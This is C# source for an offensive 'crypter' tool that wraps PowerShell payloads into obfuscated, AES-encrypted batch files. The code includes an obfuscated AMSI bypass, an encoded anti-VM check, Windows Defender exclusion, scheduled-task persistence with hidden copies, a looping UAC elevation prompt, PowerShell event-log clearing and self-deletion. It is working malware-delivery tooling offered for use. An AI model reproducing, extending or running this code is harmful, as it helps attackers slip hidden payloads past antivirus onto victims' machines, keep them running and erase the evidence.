// https://github.com/Chainski/PandaCrypter
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace PandaCrypter
{
    public class StubGen
    {
        private readonly RandomStringGenerator _rngStr;
        private readonly byte[] Key;
        private readonly byte[] IV;
        private readonly Random _rng;
        private readonly bool _amsiPatch;
        private bool _antiVM;
        public StubGen(byte[] key, byte[] iv, Random rng, bool amsiPatch = false, bool antiVM = false, bool selfDelete = false, bool debug = false)
        {
            _rngStr = new RandomStringGenerator(rng);
            Key = key;
            IV = iv;
            _rng = rng;
            _amsiPatch = amsiPatch;
            _antiVM = antiVM;
        }
        public static string GetObfIEX(int v, Random rng)
        {
            int n = rng.Next(0, v);
            return $"[char]({n}+{v - n})";
        }
        private string RandomCase(string input)
        {
            char[] chars = input.ToCharArray();
            for (int i = 0; i < chars.Length; i++)
            {
                chars[i] = _rng.Next(0, 2) == 0
                    ? char.ToUpper(chars[i])
                    : char.ToLower(chars[i]);
            }
            return new string(chars);
        }
        string MixedEncoding(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            var parts = new List<string>();
            int index = 0;
            while (index < input.Length)
            {
                int chunkSize = _rng.Next(7, 11);
                if (index + chunkSize > input.Length)
                    chunkSize = input.Length - index;
                string chunk = input.Substring(index, chunkSize);
                if (_rng.Next(0, 2) == 0)
                {
                    string base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(chunk));
                    parts.Add($"[{RandomCase("text.encoding")}]::UTF8.{RandomCase("getstring")}([{RandomCase("convert")}]::FromBase64String('{base64}'))");
                }
                else
                {
                    string bytes = string.Join(",", Encoding.UTF8.GetBytes(chunk));
                    parts.Add($"[{RandomCase("text.encoding")}]::UTF8.{RandomCase("getstring")}(({bytes}))");
                }
                index += chunkSize;
            }
            return string.Join("+", parts);
        }
        public string ObfuscatedAmsiPatch()
        {
            int num1 = _rng.Next(1, 1000);
            string nullExpression = $"{num1}-{num1}";  
            int equalNum = _rng.Next(1, 1000);
            string trueExpression = $"{equalNum}-eq{equalNum}"; 
            string systemManagement = MixedEncoding("System.Management.");
            string automationAmsi = MixedEncoding("Automation.Amsi");
            string utils = MixedEncoding("Utils");
            string amsiInitFailed = MixedEncoding("amsiInitFailed");
            string nonPublicStatic = MixedEncoding("NonPublic,Static");
            string patch =
                "[" + RandomCase("ref") + "]." + RandomCase("assembly") + "." + RandomCase("gettype") +
                "((" + systemManagement + "+" + automationAmsi + "+" + utils + "))" +
                "." + RandomCase("getfield") + "(" + amsiInitFailed + "," + nonPublicStatic + ")" +
                "." + RandomCase("setvalue") + "(" + nullExpression + "," + trueExpression + ");";
            return patch;
        }
       public string CreatePS()
        {
            string Randomizer(string input, Random rng)
            {
                int partCount = _rng.Next(3, 5);
                var parts = new List<string>();
                int idx = 0;
                for (int i = 0; i < partCount; i++)
                {
                    int remaining = input.Length - idx;
                    int nextLen = (i == partCount - 1) ? remaining : _rng.Next(1, remaining - (partCount - i - 1));
                    string segment = input.Substring(idx, nextLen);
                    segment = new string(segment.Select(c =>
                    _rng.Next(2) == 0 ? char.ToLower(c) : char.ToUpper(c)).ToArray());
                    parts.Add($"'{segment}'");
                    idx += nextLen;
                }
                return "(" + string.Join("+", parts) + ")";
            }
			string DecompressString = Randomizer("Decompress", _rng);
            string base64DecodeString = Randomizer("FromBase64String", _rng);
            var replacements = new Dictionary<string, string>
            {
				{ "FromBase64String", base64DecodeString},
				{ "Decompress", DecompressString},
                { "DECRYPTION_KEY", Convert.ToBase64String(Key) },
                { "DECRYPTION_IV", Convert.ToBase64String(IV) },
                { "contents_var", _rngStr.Get(14) },
                { "lastline_var", _rngStr.Get(14) },
                { "line_var", _rngStr.Get(14) },
                { "payload_var", _rngStr.Get(14) },
                { "aes_var", _rngStr.Get(14) },
				{ "msi_var", _rngStr.Get(14) },
				{ "mso_var", _rngStr.Get(14) },
				{ "gs_var", _rngStr.Get(14) },
                { "IEX", $"&({GetObfIEX(105, _rng)}+{GetObfIEX(101, _rng)}+{GetObfIEX(120, _rng)})" },				
                { Environment.NewLine, string.Empty }
            };
            string template = "$contents_var = (gC -Pat '%~F0' -rA) -split '\\n';" +
                              "ForEach ($line_var IN $contents_var) { iF ($line_var.sTaRTswIth(':: ')) { $lastline_var = $line_var.SubSTrinG(3); BReAK; }; }";
		if (_amsiPatch)
        {
            template += ObfuscatedAmsiPatch();
        }				
                 template += "$payload_var=[conVeRt]::FromBase64String($lastline_var);" +
                        "$aes_var=[seCuRItY.crYPtOGrAphY.AESmANAGeD]::NEW();" +
                        "$aes_var.Key=[coNveRt]::FromBase64String('DECRYPTION_KEY');" +
                        "$aes_var.IV=[CoNverT]::FromBase64String('DECRYPTION_IV');" +
                        "$payload_var=$aes_var.creATeDecryPToR().('tR'+'Ansf'+'ormF'+'InALbL'+'OcK')($payload_var,0,$payload_var.LENgth);" +
                        "$msi_var=[io.mEmOrysTREam]::NEw($payload_var);" +
                        "$mso_var=[io.MeMOrystReaM]::New();" +
                        "$gs_var=[iO.coMpreSsIoN.GziPstREAm]::NEW($msi_var,[iO.COMpressiON.COMpresSiOnMoDe]::Decompress);" +
                        "$gs_var.cOpYTO($mso_var);" +
                        "IEX([TeXT.EnCOdInG]::UtF8.GetStriNG($mso_var.tOARRAY()));eXiT";
            StringBuilder result = new StringBuilder(template);
            foreach (var kv in replacements)
            {
                result.Replace(kv.Key, kv.Value);
            }

            return result.ToString();
        }
    }
    public class Obfuscator
    {
        public static (string, string) GenCodeBat(string input, Random rng, string setvarname = null, int level = 5)
        {
            setvarname = setvarname ?? Utils.RandomString(24, rng);
            string ret = $"%!%s%!%^E%!%T%!% \"%!%{setvarname}%!%=s%!%^E%!%t%!% %!%\"".Replace(@"!", Utils.RandomString(15, rng)) + Environment.NewLine;
            string[] lines = input.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
            int amount = 7;
            if (level > 1) amount -= level;
            amount *= 2;
            List<string> setlines = new List<string>();
            List<string[]> linevars = new List<string[]>();
            foreach (string line in lines)
            {
                List<string> splitted = new List<string>();
                string sc = string.Empty;
                bool invar = false;
                foreach (char c in line)
                {
                    if (c == '%')
                    {
                        invar = !invar;
                        sc += c;
                        continue;
                    }
                    if ((c == ' ' || c == '\'' || c == '.') && invar)
                    {
                        invar = false;
                        sc += c;
                        continue;
                    }
                    if (!invar && sc.Length >= amount)
                    {
                        splitted.Add(sc);
                        invar = false;
                        sc = string.Empty;
                    }
                    sc += c;
                }
                splitted.Add(sc);
                List<string> vars = new List<string>();
                foreach (string s in splitted)
                {
                    string name = Utils.RandomString(21, rng);
                    setlines.Add($"%{setvarname}%\"{name}={s}\"");
                    vars.Add(name);
                }
                linevars.Add(vars.ToArray());
            }
            setlines = new List<string>(setlines.OrderBy(x => rng.Next()));
            for (int i = 0; i < setlines.Count; i++)
            {
                ret += setlines[i] + Environment.NewLine;
            }
            string varcalls = string.Empty;
            foreach (string[] line in linevars)
            {
                foreach (string s in line) varcalls += $"%{s}%";
                varcalls += Environment.NewLine;
            }
            return (ret.TrimEnd('\r', '\n'), varcalls.TrimEnd('\r', '\n'));
        }
    }
    public static class Utils
    {
        public static string RandomString(int length, Random rng)
        {
            string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
        }
        public static string ObfuscatePowerShellCommand(string command, Random rng)
        {
            string[] parts = { "p", "O", "w", "E", "r", "S", "h", "E", "l", "l" };
            StringBuilder obfuscated = new StringBuilder();
            foreach (string part in parts)
            {
                string mixedCase = new string(part.Select(c => rng.Next(2) == 0 ? char.ToLower(c) : char.ToUpper(c)).ToArray());
                obfuscated.Append($"\"{mixedCase}\"");
            }
            int spaceIndex = command.IndexOf(' ');
            if (spaceIndex != -1)
            {
                obfuscated.Append(command.Substring(spaceIndex));
            }
            return obfuscated.ToString();
        }
        public static byte[] Compress(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(mso, CompressionMode.Compress);
            msi.CopyTo(gs);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }
        public static byte[] Encrypt(byte[] bytes, byte[] key, byte[] iv)
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;
                using (ICryptoTransform encryptor = aes.CreateEncryptor())
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(bytes, 0, bytes.Length);
                    }
                    return ms.ToArray();
                }
            }
        }
    }
    public class RandomStringGenerator
    {
        private readonly Random _rng;
        public RandomStringGenerator(Random rng) { _rng = rng; }
        public string Get(int length)
        {
            return Utils.RandomString(length, _rng);
        }
    }
    public class Program
    {
        public static class Banner
        {
            public static void ShowBanner(bool showUsage = false)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                string bannerText =
                    "██████╗  █████╗ ███╗   ██╗██████╗  █████╗  ██████╗██████╗ ██╗   ██╗██████╗ ████████╗███████╗██████╗ \n" +
                    "██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗\n" +
                    "██████╔╝███████║██╔██╗ ██║██║  ██║███████║██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   █████╗  ██████╔╝\n" +
                    "██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██╔══╝  ██╔══██╗\n" +
                    "██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╗██║  ██║   ██║   ██║        ██║   ███████╗██║  ██║\n" +
                    "╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝\n";
                Console.Write(bannerText);
                if (showUsage)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    string usageText =
                        "\n[!] Usage:\n" +
                        "    PandaCrypter -i <input.ps1> -o <output.bat> [options]\n" +
                        "\n" +
                        "    Options:\n" +
						"      -debug              Enable Debug mode\n" +
                        "      -amsi               AMSI bypass\n" +
                        "      -antivm             Evade Virtual Machines\n" +
                        "      -sleep              Delay execution\n" +
                        "      -admin              Run as administrator\n" +
                        "      -selfdelete         Delete itself after execution\n" +
                        "      -startup            Add to startup\n" +
                        "      -defender_exclusion Add Windows Defender exclusion\n";
                    Console.Write(usageText);
                }
                Console.ResetColor();
            }
            public static void ShowSummary(string inputFile, string outputFile, bool amsiPatch, bool antiVM, bool runAsAdmin, bool startup, bool selfDelete, bool exclude, bool sleepDelay, bool debug)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] Payload Generation Complete!");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("\n[+] Arguments Passed:");
                PrintArg("Input File", inputFile);
                PrintArg("Output File", outputFile);
                PrintArg("Evade VM", antiVM);
				PrintArg("Debug Mode", debug);
                PrintArg("Bypass AMSI", amsiPatch);
                PrintArg("Run as Admin", runAsAdmin);
                PrintArg("Add to Startup", startup);
                PrintArg("Self Delete", selfDelete);
                PrintArg("Exclude Defender", exclude);
                PrintArg("Sleep", sleepDelay);
                Console.ResetColor();
            }
            private static void PrintArg(string name, object value)
            {
                string status = value is bool b ? (b ? "[+] Enabled" : "[-] Disabled") : value.ToString();
                Console.WriteLine($"{name,-18}: {status}");
            }
        }
        private static string BatchPadding(Random rng)
        {
            var sb = new StringBuilder();
            int lines = rng.Next(5, 7);
            for (int j = 0; j < lines; j++)
            {
                sb.Append("::").Append(new string(':', rng.Next(1090, 1100)));
                if (j < lines - 1) sb.AppendLine();
            }
            return sb.ToString();
        }
        public static void Main(string[] args)
        {
            string url = "https://github.com/Chainski/PandaCrypter";
            string filePath = "PandaCrypter.url";
            using (StreamWriter writer = new StreamWriter(filePath))
            {
                writer.WriteLine("[InternetShortcut]");
                writer.WriteLine("URL=" + url);
            }
            if (args.Length < 4 || args[0] != "-i" || args[2] != "-o")
            {
                Banner.ShowBanner(true);
                return;
            }
            string inputFile = args[1];
            string outputFile = args[3];
			bool debug = args.Contains("-debug");
            bool amsiPatch = args.Contains("-amsi");
            bool antiVM = args.Contains("-antivm");
            bool runAsAdmin = args.Contains("-admin");
            bool sleepDelay = args.Contains("-sleep");
            bool startup = args.Contains("-startup");
            bool selfDelete = args.Contains("-selfdelete");
            bool exclude = args.Contains("-defender_exclusion");
            if (!File.Exists(inputFile))
            {
                Console.WriteLine($"Error: Input file '{inputFile}' not found.");
                return;
            }
            Random rng = new Random();
            byte[] key = new byte[32];
            byte[] iv = new byte[16];
            rng.NextBytes(key);
            rng.NextBytes(iv);
			Banner.ShowBanner();
			Console.WriteLine();
            if (debug)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[+] AES Key: {Convert.ToBase64String(key)}");
                Console.WriteLine($"[+] AES IV: {Convert.ToBase64String(iv)}");
                Console.ResetColor();
            }
            var stubGen = new StubGen(key, iv, rng, amsiPatch, antiVM, selfDelete, debug);
            string psContent = File.ReadAllText(inputFile);
            string finalPsContent = ""; 
            if (antiVM)
            {
                string obfIEX = $"&({StubGen.GetObfIEX(105,rng)}+{StubGen.GetObfIEX(101,rng)}+{StubGen.GetObfIEX(120,rng)})";
                string antiVmCheck = $"{obfIEX}([iO.streaMREADER]::new([Io.cOmpResSIoN.GziPstREAm]::new([iO.meMORYSTreAm][convert]::('fR'+'OM'+'B'+'A'+('SE'+'6')+('4'+'STR')+('In'+'G'))('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'), [io.coMprEsSIon.cOMPREssiOnMoDE]::('d'+'ec'+'om'+'P'+('r'+'eS')+'s'))).('Re'+'AD'+('T'+'oE')+'n'+'d')());";
                finalPsContent = antiVmCheck; 
            }
		    if (exclude)
            {
                string wdexclusions = $"AdD-MPpREfEReNCE -exCluSioNPaTh @($env:UserProfile, $env:ProGrAmDatA) -ForcE;[Threading.Thread]::Sleep(1000);";
				finalPsContent += wdexclusions;
            }
            if (startup)
            {
                string randomFileName = Utils.RandomString(8, rng);
                string randomStartupName = Utils.RandomString(8, rng);
                string varAction = Utils.RandomString(8, rng);
                string varTrigger = Utils.RandomString(8, rng);
                string varSettings = Utils.RandomString(8, rng);
                string startupPs =
                    $"$destPath = \"$env:ProgramData\\{randomFileName}.bat\"; " +
                    $"if (!(Test-Path $destPath)) {{ copy  $env:MY_BAT_PATH -Destination $destPath -Force -EA 0; " +
                    $"if (Test-Path $destPath) {{ (gi $destPath).Attributes = 'Hidden' }} }}; " +
                    $"${varAction} = New-ScheduledTaskAction -Execute 'conhost' -Argument '--headless cmd /c %ProgramData%\\{randomFileName}.bat'; " +
                    $"${varTrigger} = New-ScheduledTaskTrigger -AtLogon; " +
                    $"${varSettings} = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000); " +
                    $"Register-ScheduledTask -Action ${varAction} -Trigger ${varTrigger} -TaskName '{randomStartupName}' -RunLevel Highest -Force -Settings ${varSettings} | OUt-nUll;";
                finalPsContent += startupPs;
            }
            finalPsContent += psContent; 
            byte[] psBytes = Encoding.UTF8.GetBytes(finalPsContent);
            byte[] compressed = Utils.Compress(psBytes);
            byte[] encrypted = Utils.Encrypt(compressed, key, iv);
            string encryptedPayload = Convert.ToBase64String(encrypted);
            string psStub = stubGen.CreatePS();
            StringBuilder finalBat = new StringBuilder();
            StringBuilder batScript = new StringBuilder();
            string RandomSetVarName = Utils.RandomString(11, rng);
            finalBat.AppendLine(BatchPadding(rng));
            finalBat.AppendLine(@"%!%@%!%E^%!%C^%!%h^%!%o%!% %!%o%!%f%!%f%!%".Replace(@"!", Utils.RandomString(20, rng)));
			finalBat.AppendLine(@"%!%s%!%e%!%t%!% %!%M%!%Y%!%_%!%B%!%A%!%T%!%_%!%P%!%A%!%T%!%H%!%=%~dpnx0".Replace(@"!", Utils.RandomString(20, rng)));
            if (runAsAdmin)
            {
                string runascodePlain = "powershell -w 1 \"WHILE(1){TrY{sTarT -veRb rUNaS -fIlEPAtH '%~F0';eXIt}CATcH{}}\" & exIT";
                string runascode = Utils.ObfuscatePowerShellCommand(runascodePlain, rng) + Environment.NewLine + "cd /d %1";
                var netfileobf = Obfuscator.GenCodeBat(@"net file >nul 2>&1", rng, RandomSetVarName, 3);
                var runasobf = Obfuscator.GenCodeBat("if NOT %errorlevel%==0 ( " + runascode + ")", rng, RandomSetVarName, 3);
                finalBat.AppendLine(BatchPadding(rng));
                finalBat.AppendLine(netfileobf.Item1);
                finalBat.AppendLine(netfileobf.Item2);
                finalBat.AppendLine(runasobf.Item1);
                finalBat.AppendLine(runasobf.Item2);
            }
            if (sleepDelay)
            {
                finalBat.AppendLine(BatchPadding(rng));
                finalBat.AppendLine($"%!%t^%!%I^%!%m^%!%E^%!%o^%!%U^%!%T%!% %!%^/t%!% 10 %!%^/NObrEak%!% >Nul".Replace("!", Utils.RandomString(7, rng)));
                batScript.Clear();
                finalBat.AppendLine(BatchPadding(rng));
            }
            string mainPsCommandPlain = $"powershell \"{psStub}\"";
            finalBat.AppendLine(BatchPadding(rng));
            string mainPsCommand = Utils.ObfuscatePowerShellCommand(mainPsCommandPlain, rng);
            batScript.AppendLine(mainPsCommand);
            var (obfSet, obfCall) = Obfuscator.GenCodeBat(batScript.ToString(), rng, null, 3);
            finalBat.AppendLine(obfSet);
            finalBat.AppendLine(obfCall);
            finalBat.AppendLine($":: {encryptedPayload}");
            finalBat.AppendLine(BatchPadding(rng));
			string LogCleaner = $"powershell \"try{{$lc=[DIAGnosTiCS.EvEntiNg.reADER.EVENTLOgSessioN]::glObAlSeSsION;$lc.('ClearL'+[char]111+'g')('Windows PowerShell');$lc.('ClearL'+[char]111+'g')('Microsoft-Windows-PowerShell/Operational')}}catch{{}}\"";
			string LogCleanerCommand = Utils.ObfuscatePowerShellCommand(LogCleaner, rng);
			var cleanervar = Obfuscator.GenCodeBat(LogCleaner, rng, RandomSetVarName, 3);
            finalBat.AppendLine(cleanervar.Item1);
            finalBat.AppendLine(cleanervar.Item2);
            finalBat.AppendLine(BatchPadding(rng));
            if (selfDelete)
            {
                string deleteCode = "eCho %~F0|FiNd /I \"pROGrAMdATa\">NUL&&eXit\r\n" +
                                  ":loop\r\n" +
                                  "eRase \"%~f0\">nUL 2>&1&&EXIT\r\n" +
                                  "TImeOut /t 1 /noBREAK >nul 2>&1\r\n" +
                                  "gOtO loOp";
                var selfdeletevar = Obfuscator.GenCodeBat(deleteCode, rng, RandomSetVarName, 3);
                finalBat.AppendLine(selfdeletevar.Item1);
                finalBat.AppendLine(selfdeletevar.Item2);
                finalBat.AppendLine(BatchPadding(rng));
            }
            finalBat.AppendLine(BatchPadding(rng));
            finalBat.AppendLine(@"%!%e%!%X%!%i%!%T%!%".Replace(@"!", Utils.RandomString(11, rng)));
            File.WriteAllText(outputFile, finalBat.ToString());
            Banner.ShowSummary(inputFile, outputFile, amsiPatch, antiVM, runAsAdmin, startup, selfDelete, exclude, sleepDelay, debug);
        }
    }

}